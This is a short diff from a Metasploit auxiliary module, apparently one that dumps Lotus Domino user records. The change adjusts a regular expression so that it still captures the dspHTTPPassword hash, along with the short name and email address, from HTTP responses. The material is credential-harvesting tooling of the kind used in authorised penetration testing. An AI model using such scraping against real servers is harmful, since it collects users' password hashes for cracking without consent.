@@ -162,7 +162,7 @@ class Metasploit3 < Msf::Auxiliary
       if (res and res.body)
         short_name = res.body.scan(/<INPUT NAME=\"ShortName\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
         user_mail = res.body.scan(/<INPUT NAME=\"InternetAddress\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
-        pass_hash = res.body.scan(/<INPUT NAME=\"dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
+        pass_hash = res.body.scan(/<INPUT NAME=\"\$?dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
 
         if short_name.to_s.strip.empty?
           short_name = 'NULL'
